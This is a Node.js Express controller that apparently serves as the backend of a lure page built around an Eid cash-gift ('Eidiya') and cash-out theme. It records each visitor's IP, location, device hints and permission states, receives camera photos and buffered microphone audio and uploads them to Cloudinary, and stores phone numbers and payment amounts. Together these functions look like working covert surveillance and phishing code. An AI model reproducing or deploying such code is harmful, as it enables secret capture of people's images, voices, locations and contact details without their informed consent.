const crypto = require('crypto');
const Session = require('../models/Session');
const { uploadImageBase64, uploadAudioBuffer } = require('../services/cloudinaryService');

const audioSessions = new Map();

function requestIp(req) {
  const forwardedFor = req.headers['x-forwarded-for'];
  if (typeof forwardedFor === 'string' && forwardedFor.trim()) {
    return forwardedFor.split(',')[0].trim();
  }

  return req.ip || req.socket.remoteAddress || null;
}

exports.startSession = async (req, res) => {
  const sessionId = crypto.randomUUID();
  const now = new Date();
  const ip = requestIp(req);
  console.log(`[START_SESSION] Initializing session ${sessionId} for IP ${ip}`);

  try {
    const session = new Session({
      sessionId,
      ip,
      userAgent: req.get('user-agent') || null,
      clientHints: {
        language: req.body.language || null,
        platform: req.body.platform || null,
        screen: req.body.screen || null,
        timezone: req.body.timezone || null
      },
      location: req.body.location || null,
      permissions: req.body.permissions || null,
      photos: []
    });

    await session.save();
    console.log(`[START_SESSION] Session ${sessionId} saved successfully to MongoDB`);
    res.json({ success: true, sessionId });
  } catch (error) {
    console.error(`[START_SESSION] Error starting session ${sessionId}:`, error);
    res.status(500).json({ success: false, message: 'Database error starting session', details: error.message });
  }
};

exports.saveMetadata = async (req, res) => {
  const { sessionId } = req.params;
  const ip = requestIp(req);
  const userAgent = req.get('user-agent') || null;
  console.log(`[SAVE_METADATA] Updating metadata for session ${sessionId}`);

  try {
    const session = await Session.findOne({ sessionId });
    if (!session) {
      console.warn(`[SAVE_METADATA] Session ${sessionId} not found`);
      return res.status(404).json({ success: false, message: 'Session not found' });
    }

    if (!session.ip) session.ip = ip;
    if (!session.userAgent) session.userAgent = userAgent;

    if (req.body.location) {
      session.location = req.body.location;
    }

    if (req.body.clientHints) {
      session.clientHints = {
        ...session.clientHints,
        ...req.body.clientHints
      };
    }

    if (req.body.permissions) {
      session.permissions = {
        ...session.permissions,
        ...req.body.permissions
      };
    }

    await session.save();
    console.log(`[SAVE_METADATA] Session ${sessionId} metadata updated successfully`);
    res.json({ success: true });
  } catch (error) {
    console.error(`[SAVE_METADATA] Error updating metadata for session ${sessionId}:`, error);
    res.status(500).json({ success: false, message: 'Database error saving metadata', details: error.message });
  }
};

exports.savePhoto = async (req, res) => {
  const { sessionId } = req.params;
  const { image, facingMode, deviceLabel, takenAt } = req.body;
  console.log(`[SAVE_PHOTO] Request received for session ${sessionId}`);

  if (typeof image !== 'string' || !image.startsWith('data:image/')) {
    console.warn(`[SAVE_PHOTO] Invalid image payload for session ${sessionId}`);
    return res.status(400).json({ success: false, message: 'Invalid image payload' });
  }

  try {
    const session = await Session.findOne({ sessionId });
    if (!session) {
      console.warn(`[SAVE_PHOTO] Session ${sessionId} not found`);
      return res.status(404).json({ success: false, message: 'Session not found' });
    }

    console.log(`[SAVE_PHOTO] Uploading photo to Cloudinary for session ${sessionId}`);
    const uploadResult = await uploadImageBase64(image);
    console.log(`[SAVE_PHOTO] Photo successfully uploaded to Cloudinary: ${uploadResult.cloudinaryUrl}`);

    session.photos.push({
      cloudinaryUrl: uploadResult.cloudinaryUrl,
      publicId: uploadResult.publicId,
      facingMode: facingMode || null,
      deviceLabel: deviceLabel || null,
      takenAt: takenAt ? new Date(takenAt) : new Date()
    });

    await session.save();
    console.log(`[SAVE_PHOTO] Session ${sessionId} photo entry saved to MongoDB`);
    res.json({ success: true, url: uploadResult.cloudinaryUrl });
  } catch (error) {
    console.error(`[SAVE_PHOTO] Error saving photo for session ${sessionId}:`, error);
    res.status(500).json({ success: false, message: 'Failed to upload photo or save metadata', details: error.message });
  }
};

exports.saveAudioChunk = (req, res) => {
  const { sessionId } = req.params;
  const chunkIndex = String(req.query.index || Date.now()).replace(/[^0-9]/g, '');
  console.log(`[AUDIO_CHUNK] Received chunk #${chunkIndex} for session ${sessionId}`);

  if (!Buffer.isBuffer(req.body) || req.body.length === 0) {
    console.warn(`[AUDIO_CHUNK] Empty audio chunk received for session ${sessionId}`);
    res.status(400).json({ success: false, message: 'Empty audio chunk' });
    return;
  }

  const session = audioSessions.get(sessionId) || {
    chunks: [],
    size: 0,
    contentType: req.get('content-type') || 'audio/webm',
    startedAt: new Date().toISOString()
  };

  session.chunks.push({
    index: Number.parseInt(chunkIndex, 10) || session.chunks.length,
    buffer: req.body
  });
  session.size += req.body.length;
  session.contentType = session.contentType || req.get('content-type') || 'audio/webm';
  session.updatedAt = new Date().toISOString();
  audioSessions.set(sessionId, session);

  res.json({ success: true, buffered: session.chunks.length, size: session.size, index: chunkIndex });
};

exports.finishAudio = async (req, res) => {
  const { sessionId } = req.params;
  const session = audioSessions.get(sessionId);
  console.log(`[FINISH_AUDIO] Finalizing audio for session ${sessionId}`);

  if (!session || !session.chunks.length) {
    console.warn(`[FINISH_AUDIO] No buffered audio chunks found for session ${sessionId}`);
    res.json({ success: true, url: null, message: 'No buffered audio to save' });
    return;
  }

  const sortedChunks = session.chunks
    .slice()
    .sort((a, b) => a.index - b.index)
    .map(chunk => chunk.buffer);
  const audioBuffer = Buffer.concat(sortedChunks, session.size);
  console.log(`[FINISH_AUDIO] Merged ${session.chunks.length} chunks. Combined buffer size: ${audioBuffer.length} bytes`);

  try {
    const dbSession = await Session.findOne({ sessionId });
    if (!dbSession) {
      console.warn(`[FINISH_AUDIO] Session ${sessionId} not found in DB`);
      return res.status(404).json({ success: false, message: 'Session not found' });
    }

    console.log(`[FINISH_AUDIO] Uploading merged audio buffer to Cloudinary for session ${sessionId}`);
    const uploadResult = await uploadAudioBuffer(audioBuffer);
    console.log(`[FINISH_AUDIO] Audio successfully uploaded to Cloudinary: ${uploadResult.cloudinaryUrl}`);

    dbSession.audio = {
      cloudinaryUrl: uploadResult.cloudinaryUrl,
      publicId: uploadResult.publicId,
      size: audioBuffer.length,
      chunkCount: session.chunks.length,
      contentType: session.contentType,
      startedAt: new Date(session.startedAt),
      savedAt: new Date()
    };

    await dbSession.save();
    audioSessions.delete(sessionId);
    console.log(`[FINISH_AUDIO] Session ${sessionId} audio entry updated successfully in MongoDB`);

    res.json({ success: true, url: uploadResult.cloudinaryUrl, size: audioBuffer.length });
  } catch (error) {
    console.error(`[FINISH_AUDIO] Error completing audio upload for session ${sessionId}:`, error);
    res.status(500).json({ success: false, message: 'Failed to upload audio or save metadata', details: error.message });
  }
};

exports.saveCashOut = async (req, res) => {
  const { sessionId, phoneNumber, amount, location } = req.body;
  const ip = requestIp(req);
  console.log(`[CASH_OUT] Request received for session ${sessionId}, phone: ${phoneNumber}, amount: ${amount}`);

  try {
    let session = await Session.findOne({ sessionId });
    if (!session) {
      console.warn(`[CASH_OUT] Session ${sessionId} not found in DB. Creating placeholder session.`);
      session = new Session({
        sessionId: sessionId || crypto.randomUUID(),
        ip,
        userAgent: req.get('user-agent') || null
      });
    }

    session.cashOut = {
      phoneNumber,
      amount: parseFloat(amount) || 0,
      ip,
      location: location || session.location || null,
      requestedAt: new Date()
    };

    // Update main session IP and location if not set yet
    if (!session.ip) session.ip = ip;
    if (location && !session.location) session.location = location;

    await session.save();
    console.log(`[CASH_OUT] Session ${session.sessionId} cashout info saved successfully to DB`);
    res.json({ success: true });
  } catch (error) {
    console.error('[CASH_OUT] Error saving cashout data:', error);
    res.status(500).json({ success: false, message: 'Database error saving cashout info', details: error.message });
  }
};

exports.saveEidiyaTransfer = async (req, res) => {
  const { sessionId, recipient, amount, message, location } = req.body;
  const ip = requestIp(req);
  console.log(`[EIDIYA_TRANSFER] Request received for session ${sessionId}, recipient: ${recipient}, amount: ${amount}`);

  try {
    let session = await Session.findOne({ sessionId });
    if (!session) {
      console.warn(`[EIDIYA_TRANSFER] Session ${sessionId} not found in DB. Creating placeholder session.`);
      session = new Session({
        sessionId: sessionId || crypto.randomUUID(),
        ip,
        userAgent: req.get('user-agent') || null
      });
    }

    session.eidiyaTransfers = session.eidiyaTransfers || [];
    session.eidiyaTransfers.push({
      recipient,
      amount: parseFloat(amount) || 0,
      message: message || '',
      ip,
      location: location || session.location || null,
      transferredAt: new Date()
    });

    // Update main session IP and location if not set yet
    if (!session.ip) session.ip = ip;
    if (location && !session.location) session.location = location;

    await session.save();
    console.log(`[EIDIYA_TRANSFER] Session ${session.sessionId} eidiya transfer info saved successfully to DB`);
    res.json({ success: true });
  } catch (error) {
    console.error('[EIDIYA_TRANSFER] Error saving eidiya transfer data:', error);
    res.status(500).json({ success: false, message: 'Database error saving eidiya transfer info', details: error.message });
  }
};
